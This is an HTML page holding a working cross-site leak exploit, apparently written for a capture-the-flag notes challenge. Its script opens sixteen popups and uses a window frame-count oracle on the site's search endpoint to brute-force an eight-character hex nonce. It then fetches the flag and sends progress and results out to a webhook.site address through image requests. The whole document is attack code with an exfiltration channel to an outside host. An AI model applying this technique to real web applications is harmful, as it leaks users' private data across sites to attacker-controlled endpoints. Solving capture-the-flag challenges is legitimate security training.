<!DOCTYPE html>
<html>
<body>
<script>
var CHALL = 'https://notes.chall.lac.tf';
var WH = 'https://webhook.site/c9c4e814-b8d9-47ab-ace4-1afa4d09088f';
var HEX = '0123456789abcdef';

function ping(m) { new Image().src = WH + '?' + encodeURIComponent(m); }
function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }

function url(prefix) {
  return CHALL + '/?name=x&referrerPolicy=adf&search=' + encodeURIComponent(prefix);
}

async function run() {
  ping('xpl_start');
  var t0 = Date.now();

  // Open 16 popups up front (avoid close+reopen popup blocking)
  var P = [];
  for (var i = 0; i < 16; i++) {
    try { P.push(window.open('about:blank')); } catch(e) { P.push(null); }
    await sleep(20);
  }
  var cnt = 0;
  for (var i = 0; i < 16; i++) if (P[i] && !P[i].closed) cnt++;
  ping('pop=' + cnt);
  if (cnt === 0) { ping('no_popups'); return; }

  var nonce = '';

  for (var pos = 0; pos < 8; pos++) {
    if (Date.now() - t0 > 50000) { ping('timeout_p' + pos); break; }

    var found = null;
    var n = Math.min(cnt, 16);

    // Navigate all popups to their search URLs
    for (var c = 0; c < n; c++) {
      if (!P[c] || P[c].closed) continue;
      try { P[c].location = url(nonce + HEX[c]); } catch(e) {}
    }
    await sleep(1300);

    // Cycle: check oracle then reload
    for (var cycle = 0; cycle < 25 && !found; cycle++) {
      if (Date.now() - t0 > 54000) break;

      for (var c = 0; c < n; c++) {
        if (!P[c] || P[c].closed) continue;
        try {
          var ref = P[c]['adf'];
          if (ref && P[c].length >= 6 && P[c][0] !== ref) {
            found = HEX[c];
            break;
          }
        } catch(e) {}
      }
      if (found) break;

      // Reload all for fresh shuffle
      for (var c = 0; c < n; c++) {
        if (!P[c] || P[c].closed) continue;
        try { P[c].location = url(nonce + HEX[c]); } catch(e) {}
      }
      await sleep(550);
    }

    if (found) {
      nonce += found;
      ping('p' + pos + '=' + found);
    } else {
      ping('p' + pos + '=MISS');
      break;
    }
  }

  ping('n=' + nonce);

  if (nonce.length === 8) {
    try {
      var r = await fetch(CHALL + '/guess?nonce=' + nonce);
      var f = await r.text();
      ping('FLAG=' + encodeURIComponent(f));
    } catch(e) { ping('gerr'); }
  }

  for (var i = 0; i < 16; i++) { try { if(P[i]) P[i].close(); } catch(e) {} }
  ping('done');
}
run();
</script>
</body>
</html>
